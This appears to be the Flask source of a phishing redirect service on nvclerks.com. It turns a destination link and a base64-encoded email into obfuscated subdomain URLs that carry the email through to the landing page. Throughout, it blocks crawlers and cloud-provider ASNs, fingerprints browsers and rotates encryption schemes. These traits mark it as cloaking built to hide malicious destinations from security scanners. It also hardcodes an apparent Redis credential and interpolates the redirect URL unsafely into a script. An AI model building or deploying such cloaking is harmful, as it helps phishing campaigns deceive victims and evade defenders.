from flask import Flask, request, redirect, render_template_string, abort, url_for, session
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.primitives import hashes, hmac
from cryptography.hazmat.backends import default_backend
import os
import base64
import json
import re
import urllib.parse
import secrets
import logging
import time
from datetime import datetime, timedelta
import uuid
import hashlib
from redis import Redis
from functools import wraps
import requests
import traceback

app = Flask(__name__)

# Configure logging
logging.basicConfig(
    level=logging.DEBUG,
    format='%(asctime)s - %(levelname)s - %(message)s',
    handlers=[
        logging.StreamHandler()  # Ensure logs go to Vercel
    ]
)
logger = logging.getLogger(__name__)
logger.debug("Initializing Flask app")

# Configuration
try:
    app.config['SERVER_NAME'] = 'nvclerks.com'
    app.config['SECRET_KEY'] = os.environ.get('FLASK_SECRET_KEY', secrets.token_hex(32))
    app.config['SESSION_COOKIE_HTTPONLY'] = True
    app.config['SESSION_COOKIE_SECURE'] = True
    app.config['SESSION_COOKIE_SAMESITE'] = 'Strict'
    logger.debug("Flask configuration set successfully")
except Exception as e:
    logger.error(f"Error setting Flask config: {str(e)}", exc_info=True)
    raise

# Environment variables
ENCRYPTION_KEY = os.environ.get("ENCRYPTION_KEY", secrets.token_bytes(32))
HMAC_KEY = os.environ.get("HMAC_KEY", secrets.token_bytes(32))
REDIS_URL = os.environ.get("REDIS_URL", "redis://:AZSFAAIjcDEwMzUzMTExOTI5NDY0ZTY4OWVmYWE4NzFmZjNkMzcyNXAxMA@kind-ferret-38021.upstash.io:6379")
MAXMIND_KEY = os.environ.get("MAXMIND_KEY", "")
BASE_DOMAIN = "nvclerks.com"

# Log environment variables
logger.debug(f"ENCRYPTION_KEY: {'set' if ENCRYPTION_KEY else 'not set'}")
logger.debug(f"HMAC_KEY: {'set' if HMAC_KEY else 'not set'}")
logger.debug(f"REDIS_URL: {REDIS_URL[:50]}...")
logger.debug(f"MAXMIND_KEY: {'set' if MAXMIND_KEY else 'not set'}")

# Redis initialization
redis_client = None
try:
    redis_client = Redis.from_url(REDIS_URL, decode_responses=True, ssl=True)
    redis_client.ping()
    logger.debug("Redis connection established successfully")
except Exception as e:
    logger.error(f"Redis connection failed: {str(e)}", exc_info=True)
    redis_client = None

# Bot detection
BOT_PATTERNS = [
    "bot", "crawl", "spider", "slurp", "facebookexternalhit", "googlebot",
    "bingbot", "yandex", "duckduckbot"
]

def is_bot(user_agent):
    try:
        if not user_agent:
            logger.warning("No User-Agent provided")
            return True
        user_agent = user_agent.lower()
        result = any(pattern in user_agent for pattern in BOT_PATTERNS)
        logger.debug(f"Bot detection result: {result} for User-Agent: {user_agent}")
        return result
    except Exception as e:
        logger.error(f"Error in is_bot: {str(e)}", exc_info=True)
        return False  # Allow non-browser clients for testing

def check_asn(ip):
    try:
        if not MAXMIND_KEY:
            logger.debug("MAXMIND_KEY not set, skipping ASN check")
            return False
        response = requests.get(f"https://api.maxmind.com/v2.0/asn/{ip}?apiKey={MAXMIND_KEY}")
        response.raise_for_status()
        asn = response.json().get('asn')
        blocked_asns = [16509, 14618, 8075, 14061, 16276]
        result = asn in blocked_asns
        logger.debug(f"ASN check for IP {ip}: ASN {asn}, Blocked: {result}")
        return result
    except Exception as e:
        logger.error(f"MaxMind ASN check failed: {str(e)}", exc_info=True)
        return False

def rate_limit(limit=10, per=60):
    def decorator(f):
        @wraps(f)
        def wrapped_function(*args, **kwargs):
            try:
                if not redis_client:
                    logger.warning("Redis unavailable, skipping rate limit")
                    return f(*args, **kwargs)
                ip = request.remote_addr
                key = f"rate_limit:{ip}:{f.__name__}"
                current = redis_client.get(key)
                if current is None:
                    redis_client.setex(key, per, 1)
                    logger.debug(f"Rate limit set for {ip}: 1/{limit}")
                elif int(current) >= limit:
                    logger.warning(f"Rate limit exceeded for IP: {ip}")
                    abort(429, "Too Many Requests")
                else:
                    redis_client.incr(key)
                    logger.debug(f"Rate limit incremented for {ip}: {int(current)+1}/{limit}")
                return f(*args, **kwargs)
            except Exception as e:
                logger.error(f"Error in rate_limit: {str(e)}", exc_info=True)
                return f(*args, **kwargs)
        return wrapped_function
    return decorator

def generate_fingerprint():
    try:
        headers = request.headers
        canvas = headers.get('X-Canvas-Fingerprint', '')
        fonts = headers.get('X-Fonts', '')
        plugins = headers.get('X-Plugins', '')
        ip = request.remote_addr
        raw = f"{canvas}{fonts}{plugins}{ip}{time.time()}"
        fingerprint = hashlib.sha256(raw.encode()).hexdigest()
        logger.debug(f"Generated fingerprint: {fingerprint[:10]}...")
        return fingerprint
    except Exception as e:
        logger.error(f"Error in generate_fingerprint: {str(e)}", exc_info=True)
        return hashlib.sha256(str(time.time()).encode()).hexdigest()

def verify_browser():
    try:
        if not redis_client:
            logger.warning("Redis unavailable, skipping browser verification")
            return True
        fingerprint = generate_fingerprint()
        session_key = f"browser:{fingerprint}"
        exists = redis_client.exists(session_key)
        if not exists:
            redis_client.setex(session_key, 3600, 1)
            logger.debug(f"New browser fingerprint: {fingerprint[:10]}...")
            return False
        logger.debug(f"Browser verified: {fingerprint[:10]}...")
        return True
    except Exception as e:
        logger.error(f"Error in verify_browser: {str(e)}", exc_info=True)
        return True

# Encryption Methods
def encrypt_heap_x3(payload, fingerprint):
    try:
        iv = secrets.token_bytes(12)
        cipher = Cipher(algorithms.AES(ENCRYPTION_KEY), modes.GCM(iv), backend=default_backend())
        encryptor = cipher.encryptor()
        data = json.dumps({"payload": payload, "fingerprint": fingerprint}).encode()
        ciphertext = encryptor.update(data) + encryptor.finalize()
        encrypted = iv + ciphertext + encryptor.tag
        slug = secrets.token_hex(50)
        result = f"{base64.urlsafe_b64encode(encrypted).decode()}.{slug}"
        logger.debug(f"HEAP X3 encrypted payload: {result[:20]}...")
        return result
    except Exception as e:
        logger.error(f"HEAP X3 encryption error: {str(e)}", exc_info=True)
        raise ValueError("Encryption failed")

def decrypt_heap_x3(encrypted):
    try:
        encrypted, _ = encrypted.split('.')
        encrypted = base64.urlsafe_b64decode(encrypted)
        iv = encrypted[:12]
        tag = encrypted[-16:]
        ciphertext = encrypted[12:-16]
        cipher = Cipher(algorithms.AES(ENCRYPTION_KEY), modes.GCM(iv, tag), backend=default_backend())
        decryptor = cipher.decryptor()
        decrypted = decryptor.update(ciphertext) + decryptor.finalize()
        result = json.loads(decrypted.decode())
        logger.debug(f"HEAP X3 decrypted payload: {json.dumps(result)[:50]}...")
        return result
    except Exception as e:
        logger.error(f"HEAP X3 decryption error: {str(e)}", exc_info=True)
        raise ValueError("Invalid payload")

def encrypt_slugstorm(payload):
    try:
        expiry = (datetime.utcnow() + timedelta(hours=24)).timestamp() * 1000
        data = json.dumps({"payload": payload, "expires": expiry})
        uuid_chain = f"{uuid.uuid4()}{secrets.token_hex(20)}"
        h = hmac.HMAC(HMAC_KEY, hashes.SHA256(), backend=default_backend())
        h.update(data.encode())
        signature = h.finalize()
        result = f"{base64.urlsafe_b64encode(data.encode()).decode()}.{uuid_chain}.{base64.urlsafe_b64encode(signature).decode()}"
        logger.debug(f"SlugStorm encrypted payload: {result[:20]}...")
        return result
    except Exception as e:
        logger.error(f"SlugStorm encryption error: {str(e)}", exc_info=True)
        raise ValueError("Encryption failed")

def decrypt_slugstorm(encrypted):
    try:
        data_b64, _, sig_b64 = encrypted.split('.')
        data = base64.urlsafe_b64decode(data_b64).decode()
        signature = base64.urlsafe_b64decode(sig_b64)
        h = hmac.HMAC(HMAC_KEY, hashes.SHA256(), backend=default_backend())
        h.update(data.encode())
        h.verify(signature)
        data = json.loads(data)
        if data['expires'] < int(time.time() * 1000):
            logger.warning("SlugStorm payload expired")
            raise ValueError("Payload expired")
        logger.debug(f"SlugStorm decrypted payload: {json.dumps(data)[:50]}...")
        return data
    except Exception as e:
        logger.error(f"SlugStorm decryption error: {str(e)}", exc_info=True)
        raise ValueError("Invalid payload")

def encrypt_pow(payload):
    try:
        iv = secrets.token_bytes(8)
        cipher = Cipher(algorithms.ChaCha20(ENCRYPTION_KEY, iv), backend=default_backend())
        encryptor = cipher.encryptor()
        data = payload.encode()
        ciphertext = encryptor.update(data) + encryptor.finalize()
        result = base64.urlsafe_b64encode(iv + ciphertext).decode()
        logger.debug(f"PoW encrypted payload: {result[:20]}...")
        return result
    except Exception as e:
        logger.error(f"PoW encryption error: {str(e)}", exc_info=True)
        raise ValueError("Encryption failed")

def decrypt_pow(encrypted):
    try:
        encrypted = base64.urlsafe_b64decode(encrypted)
        iv = encrypted[:8]
        ciphertext = encrypted[8:]
        cipher = Cipher(algorithms.ChaCha20(ENCRYPTION_KEY, iv), backend=default_backend())
        decryptor = cipher.decryptor()
        result = (decryptor.update(ciphertext) + decryptor.finalize()).decode()
        logger.debug(f"PoW decrypted payload: {result[:50]}...")
        return result
    except Exception as e:
        logger.error(f"PoW decryption error: {str(e)}", exc_info=True)
        raise ValueError("Invalid payload")

def encrypt_signed_token(payload):
    try:
        data = payload.encode()
        h = hmac.HMAC(HMAC_KEY, hashes.SHA256(), backend=default_backend())
        h.update(data)
        signature = h.finalize()
        result = f"{base64.urlsafe_b64encode(data).decode()}.{base64.urlsafe_b64encode(signature).decode()}"
        logger.debug(f"Signed Token encrypted payload: {result[:20]}...")
        return result
    except Exception as e:
        logger.error(f"Signed Token encryption error: {str(e)}", exc_info=True)
        raise ValueError("Encryption failed")

def decrypt_signed_token(encrypted):
    try:
        data_b64, sig_b64 = encrypted.split('.')
        data = base64.urlsafe_b64decode(data_b64)
        signature = base64.urlsafe_b64decode(sig_b64)
        h = hmac.HMAC(HMAC_KEY, hashes.SHA256(), backend=default_backend())
        h.update(data)
        h.verify(signature)
        result = data.decode()
        logger.debug(f"Signed Token decrypted payload: {result[:50]}...")
        return result
    except Exception as e:
        logger.error(f"Signed Token decryption error: {str(e)}", exc_info=True)
        raise ValueError("Invalid payload")

@app.route("/", methods=["GET"])
@rate_limit(limit=5, per=60)
def index():
    try:
        user_agent = request.headers.get("User-Agent", "")
        ip = request.remote_addr
        logger.debug(f"Index accessed, IP: {ip}, User-Agent: {user_agent}")
        if is_bot(user_agent) or check_asn(ip):
            logger.warning("Bot or suspicious ASN detected")
            abort(403, "Access denied")

        theme_seed = hashlib.sha256(str(uuid.uuid4()).encode()).hexdigest()[:6]
        primary_color = f"#{theme_seed}"
        secondary_color = f"#{hashlib.sha256(theme_seed.encode()).hexdigest()[6:12]}"
        logger.debug(f"Generated theme colors: {primary_color}, {secondary_color}")

        return render_template_string("""
            <!DOCTYPE html>
            <html lang="en">
            <head>
                <meta charset="UTF-8">
                <meta name="viewport" content="width=device-width, initial-scale=1.0">
                <meta name="robots" content="noindex, nofollow">
                <title>Secure URL Generator</title>
                <script src="https://cdn.tailwindcss.com"></script>
                <script>
                    let challenge = 0;
                    for (let i = 0; i < 1000; i++) challenge += Math.random();
                    fetch('/challenge', {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({ challenge })
                    }).then(response => {
                        if (!response.ok) window.location = '/denied';
                    });

                    function getCanvasFingerprint() {
                        const canvas = document.createElement('canvas');
                        const ctx = canvas.getContext('2d');
                        ctx.textBaseline = 'top';
                        ctx.font = '14px Arial';
                        ctx.fillText('Fingerprint', 2, 2);
                        return canvas.toDataURL();
                    }
                    fetch('/fingerprint', {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({ fingerprint: getCanvasFingerprint() })
                    });
                </script>
                <style>
                    body { background: linear-gradient(135deg, {{ primary_color }}, {{ secondary_color }}); }
                    .container { animation: fadeIn 1s ease-in; }
                    @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
                    input:focus { box-shadow: 0 0 0 3px rgba(99, 102, 241, 0.3); }
                    button:hover { transform: scale(1.05); }
                </style>
            </head>
            <body class="min-h-screen flex items-center justify-center p-4">
                <div class="container bg-white p-8 rounded-xl shadow-2xl max-w-md w-full">
                    <h1 class="text-3xl font-extrabold mb-6 text-center text-gray-900">Secure URL Generator</h1>
                    <form method="POST" action="{{ url_for('generate') }}" class="space-y-5">
                        <div>
                            <label class="block text-sm font-medium text-gray-700">Randomstring1</label>
                            <input type="text" name="randomstring1" required maxlength="20" class="mt-1 w-full p-3 border rounded-lg focus:ring focus:ring-indigo-300 transition">
                        </div>
                        <div>
                            <label class="block text-sm font-medium text-gray-700">Base64emailInput</label>
                            <input type="text" name="base64email" required class="mt-1 w-full p-3 border rounded-lg focus:ring focus:ring-indigo-300 transition">
                        </div>
                        <div>
                            <label class="block text-sm font-medium text-gray-700">Destination Link</label>
                            <input type="url" name="destination_link" required class="mt-1 w-full p-3 border rounded-lg focus:ring focus:ring-indigo-300 transition">
                        </div>
                        <div>
                            <label class="block text-sm font-medium text-gray-700">Randomstring2</label>
                            <input type="text" name="randomstring2" required maxlength="20" class="mt-1 w-full p-3 border rounded-lg focus:ring focus:ring-indigo-300 transition">
                        </div>
                        <button type="submit" class="w-full bg-indigo-600 text-white p-3 rounded-lg hover:bg-indigo-700 transition">Generate URL</button>
                    </form>
                </div>
            </body>
            </html>
        """, primary_color=primary_color, secondary_color=secondary_color)
    except Exception as e:
        logger.error(f"Internal Server Error in index: {str(e)}", exc_info=True)
        raise

@app.route("/challenge", methods=["POST"])
def challenge():
    try:
        data = request.get_json()
        if not data or 'challenge' not in data or not isinstance(data['challenge'], (int, float)):
            logger.warning("Invalid JS challenge")
            return {"status": "denied"}, 403
        session['js_verified'] = True
        logger.debug("JS challenge passed")
        return {"status": "ok"}, 200
    except Exception as e:
        logger.error(f"Error in challenge: {str(e)}", exc_info=True)
        return {"status": "error"}, 500

@app.route("/fingerprint", methods=["POST"])
def fingerprint():
    try:
        data = request.get_json()
        if data and 'fingerprint' in data:
            fingerprint = generate_fingerprint()
            if redis_client:
                redis_client.setex(f"fingerprint:{fingerprint}", 3600, data['fingerprint'])
                logger.debug(f"Fingerprint stored: {fingerprint[:10]}...")
        return {"status": "ok"}, 200
    except Exception as e:
        logger.error(f"Error in fingerprint: {str(e)}", exc_info=True)
        return {"status": "error"}, 500

@app.route("/generate", methods=["POST"])
@rate_limit(limit=3, per=300)
def generate():
    try:
        user_agent = request.headers.get("User-Agent", "")
        ip = request.remote_addr
        logger.debug(f"Generate accessed, IP: {ip}, User-Agent: {user_agent}")
        if is_bot(user_agent) or check_asn(ip) or not session.get('js_verified'):
            logger.warning("Bot or unverified browser detected")
            abort(403, "Access denied")

        randomstring1 = request.form.get("randomstring1", "default")
        base64email = request.form.get("base64email", "default")
        destination_link = request.form.get("destination_link", "https://example.com")
        randomstring2 = request.form.get("randomstring2", generate_random_string(8))

        # Validate inputs
        if not re.match(r"^https?://", destination_link):
            logger.error(f"Invalid URL: {destination_link}")
            abort(400, "Invalid URL")
        if len(randomstring1) > 20:
            randomstring1 = randomstring1[:20]
            logger.debug(f"Truncated Randomstring1 to 20 chars: {randomstring1}")
        if len(randomstring2) > 20:
            randomstring2 = randomstring2[:20]
            logger.debug(f"Truncated Randomstring2 to 20 chars: {randomstring2}")

        # Use Randomstring1 as subdomain (case-sensitive, up to 20 chars)
        subdomain = randomstring1 if randomstring1 else "default"
        logger.debug(f"Using subdomain: {subdomain}")
        endpoint = generate_random_string(8)
        randomstring1_short = randomstring1[:6] if len(randomstring1) >= 6 else randomstring1 + generate_random_string(6 - len(randomstring1))
        randomstring2_short = randomstring2[:8] if len(randomstring2) >= 8 else randomstring2 + generate_random_string(8 - len(randomstring2))
        base64_email = base64.urlsafe_b64encode(base64email.encode()).decode().rstrip("=")
        path_segment = f"{randomstring1_short}{base64_email}{randomstring2_short}"

        encryption_methods = ['heap_x3', 'slugstorm', 'pow', 'signed_token']
        method = secrets.choice(encryption_methods)
        fingerprint = generate_fingerprint()
        payload = json.dumps({
            "student_link": destination_link,
            "timestamp": int(time.time() * 1000)
        })

        logger.debug(f"Selected encryption method: {method}")
        try:
            if method == 'heap_x3':
                encrypted_payload = encrypt_heap_x3(payload, fingerprint)
            elif method == 'slugstorm':
                encrypted_payload = encrypt_slugstorm(payload)
            elif method == 'pow':
                encrypted_payload = encrypt_pow(payload)
            else:
                encrypted_payload = encrypt_signed_token(payload)
        except Exception as e:
            logger.error(f"Encryption failed with {method}: {str(e)}", exc_info=True)
            abort(500, "Failed to encrypt payload")
        generated_url = f"https://{urllib.parse.quote(subdomain)}.{BASE_DOMAIN}/{endpoint}/{urllib.parse.quote(encrypted_payload, safe='')}/{urllib.parse.quote(path_segment, safe='/')}"
        logger.info(f"Generated URL with {method}: {generated_url}")

        theme_seed = hashlib.sha256(str(uuid.uuid4()).encode()).hexdigest()[:6]
        primary_color = f"#{theme_seed}"

        return render_template_string("""
            <!DOCTYPE html>
            <html lang="en">
            <head>
                <meta charset="UTF-8">
                <meta name="viewport" content="width=device-width, initial-scale=1.0">
                <meta name="robots" content="noindex, nofollow">
                <title>Generated URL</title>
                <script src="https://cdn.tailwindcss.com"></script>
                <style>
                    body { background: {{ primary_color }}; }
                    .container { animation: slideIn 0.5s ease-out; }
                    @keyframes slideIn { from { transform: translateY(-20px); opacity: 0; } to { transform: translateY(0); opacity: 1; } }
                    a:hover { text-decoration: underline; }
                </style>
            </head>
            <body class="min-h-screen flex items-center justify-center p-4">
                <div class="container bg-white p-8 rounded-xl shadow-2xl max-w-lg w-full text-center">
                    <h3 class="text-2xl font-bold mb-4 text-gray-900">Your Secure URL</h3>
                    <p class="text-gray-600 mb-4">Copy or click your generated URL below:</p>
                    <a href="{{ url }}" target="_blank" class="text-indigo-600 break-all">{{ url }}</a>
                    <p class="mt-4 text-sm text-gray-500">This URL will redirect to the destination after a brief delay.</p>
                </div>
            </body>
            </html>
        """, url=generated_url, primary_color=primary_color)
    except Exception as e:
        logger.error(f"Internal Server Error in generate: {str(e)}", exc_info=True)
        raise

@app.route("/<endpoint>/<path:encrypted_payload>/<path:path_segment>", methods=["GET"], subdomain="<username>")
@rate_limit(limit=5, per=60)
def redirect_handler(username, endpoint, encrypted_payload, path_segment):
    try:
        user_agent = request.headers.get("User-Agent", "")
        ip = request.remote_addr
        logger.debug(f"Redirect handler for {username}.{BASE_DOMAIN}/{endpoint}, IP: {ip}, User-Agent: {user_agent}, Path Segment: {path_segment}")

        # Anti-bot checks with detailed logging
        if is_bot(user_agent):
            logger.warning(f"Bot detected: User-Agent={user_agent}")
        if check_asn(ip):
            logger.warning(f"Suspicious ASN detected for IP={ip}")
        if not verify_browser():
            logger.warning("Browser verification failed")
        if not session.get('js_verified'):
            logger.warning("JS challenge not completed")

        if is_bot(user_agent) or check_asn(ip) or not verify_browser() or not session.get('js_verified'):
            logger.warning("Bot or unverified browser detected")
            # Decode encrypted_payload for redirect
            try:
                encrypted_payload = urllib.parse.unquote(encrypted_payload)
                logger.debug(f"Decoded encrypted_payload: {encrypted_payload[:20]}...")
            except Exception as e:
                logger.error(f"Error decoding encrypted_payload: {str(e)}", exc_info=True)
                abort(400, "Invalid payload format")

            # Try decryption methods
            payload = None
            for method in ['heap_x3', 'slugstorm', 'pow', 'signed_token']:
                try:
                    logger.debug(f"Trying decryption method: {method}")
                    if method == 'heap_x3':
                        data = decrypt_heap_x3(encrypted_payload)
                        payload = data['payload']
                        if data['fingerprint'] != generate_fingerprint():
                            logger.warning("Fingerprint mismatch")
                            continue
                    elif method == 'slugstorm':
                        data = decrypt_slugstorm(encrypted_payload)
                        payload = data['payload']
                    elif method == 'pow':
                        payload = decrypt_pow(encrypted_payload)
                    else:
                        payload = decrypt_signed_token(encrypted_payload)
                    logger.debug(f"Decryption successful with {method}")
                    break
                except Exception as e:
                    logger.debug(f"Decryption failed with {method}: {str(e)}")
                    continue

            if not payload:
                logger.error("All decryption methods failed")
                abort(400, "Invalid payload")

            try:
                data = json.loads(payload)
                redirect_url = data.get("student_link")
                if not redirect_url or not re.match(r"^https?://", redirect_url):
                    logger.error(f"Invalid redirect URL: {redirect_url}")
                    abort(400, "Invalid redirect URL")
                logger.debug(f"Parsed payload: redirect_url={redirect_url}")
            except Exception as e:
                logger.error(f"Payload parsing error: {str(e)}", exc_info=True)
                abort(400, "Invalid payload")

            # Prepare final URL
            final_url = f"{redirect_url.rstrip('/')}/{path_segment}"
            logger.info(f"Preparing redirect to {final_url} with 2-second delay")

            # Render blank delay page
            return render_template_string("""
                <!DOCTYPE html>
                <html lang="en">
                <head>
                    <meta charset="UTF-8">
                    <meta name="robots" content="noindex, nofollow">
                    <title></title>
                    <script>
                        setTimeout(() => {
                            console.log('Redirecting to {{ final_url }}');
                            window.location.href = '{{ final_url }}';
                        }, 2000);
                    </script>
                </head>
                <body></body>
                </html>
            """, final_url=final_url)

        # Direct redirect if anti-bot checks pass
        try:
            encrypted_payload = urllib.parse.unquote(encrypted_payload)
            logger.debug(f"Decoded encrypted_payload: {encrypted_payload[:20]}...")
        except Exception as e:
            logger.error(f"Error decoding encrypted_payload: {str(e)}", exc_info=True)
            abort(400, "Invalid payload format")

        payload = None
        for method in ['heap_x3', 'slugstorm', 'pow', 'signed_token']:
            try:
                logger.debug(f"Trying decryption method: {method}")
                if method == 'heap_x3':
                    data = decrypt_heap_x3(encrypted_payload)
                    payload = data['payload']
                    if data['fingerprint'] != generate_fingerprint():
                        logger.warning("Fingerprint mismatch")
                        continue
                elif method == 'slugstorm':
                    data = decrypt_slugstorm(encrypted_payload)
                    payload = data['payload']
                elif method == 'pow':
                    payload = decrypt_pow(encrypted_payload)
                else:
                    payload = decrypt_signed_token(encrypted_payload)
                logger.debug(f"Decryption successful with {method}")
                break
            except Exception as e:
                logger.debug(f"Decryption failed with {method}: {str(e)}")
                continue

        if not payload:
            logger.error("All decryption methods failed")
            abort(400, "Invalid payload")

        try:
            data = json.loads(payload)
            redirect_url = data.get("student_link")
            if not redirect_url or not re.match(r"^https?://", redirect_url):
                logger.error(f"Invalid redirect URL: {redirect_url}")
                abort(400, "Invalid redirect URL")
            logger.debug(f"Parsed payload: redirect_url={redirect_url}")
        except Exception as e:
            logger.error(f"Payload parsing error: {str(e)}", exc_info=True)
            abort(400, "Invalid payload")

        final_url = f"{redirect_url.rstrip('/')}/{path_segment}"
        logger.info(f"Redirecting to {final_url}")
        return redirect(final_url, code=302)
    except Exception as e:
        logger.error(f"Internal Server Error in redirect_handler: {str(e)}", exc_info=True)
        raise

@app.route("/denied", methods=["GET"])
def denied():
    try:
        logger.debug("Access denied page accessed")
        return render_template_string("""
            <!DOCTYPE html>
            <html lang="en">
            <head>
                <meta charset="UTF-8">
                <meta name="robots" content="noindex, nofollow">
                <title>Access Denied</title>
                <script src="https://cdn.tailwindcss.com"></script>
            </head>
            <body class="min-h-screen bg-gray-100 flex items-center justify-center p-4">
                <div class="bg-white p-8 rounded-xl shadow-lg max-w-sm w-full text-center">
                    <h3 class="text-lg font-bold mb-4 text-red-600">Access Denied</h3>
                    <p class="text-gray-600">Suspicious activity detected.</p>
                </div>
            </body>
            </html>
        """), 403
    except Exception as e:
        logger.error(f"Error in denied: {str(e)}", exc_info=True)
        return "Access Denied", 403

def generate_random_string(length):
    try:
        characters = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
        result = "".join(secrets.choice(characters) for _ in range(length))
        logger.debug(f"Generated random string: {result}")
        return result
    except Exception as e:
        logger.error(f"Error in generate_random_string: {str(e)}", exc_info=True)
        return "x" * length

if __name__ == "__main__":
    logger.debug("Starting Flask app")
    app.run(debug=False)
